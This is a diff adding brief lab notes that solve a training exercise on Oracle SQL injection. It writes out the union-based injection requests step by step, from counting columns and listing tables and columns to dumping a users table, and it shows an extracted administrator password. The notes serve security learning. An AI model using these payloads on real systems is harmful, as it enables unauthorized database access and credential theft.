@@ -1,0 +1,17 @@
+Lab: SQL injection attack, listing the database contents on Oracle
+
+GET /filter?category=Lifestyle'+order+by+2-- HTTP/1.1
+GET /filter?category=Lifestyle'+UNION+SELECT+'a',+'a'+FROM+dual-- HTTP/1.1 [ORACLE DB]
+GET /filter?category=Lifestyle'+UNION+SELECT+table_name,+NULL+FROM+all_tables-- HTTP/1.1  [All tables de oracle]
+
+	USERS_LGCHBG
+
+GET /filter?category=Lifestyle'+UNION+SELECT+column_name,+null+from+all_tab_columns+where+table_name+%3d+'USERS_LGCHBG'-- HTTP/1.
+
+USERNAME_SLVANQ
+PASSWORD_SMEPZI
+
+
+GET /filter?category=Lifestyle'+UNION+SELECT+USERNAME_SLVANQ,+PASSWORD_SMEPZI+from+USERS_LGCHBG-- HTTP/1.1
+<th>administrator</th>
+<td>kzorxuda9wkdpsa06s7q
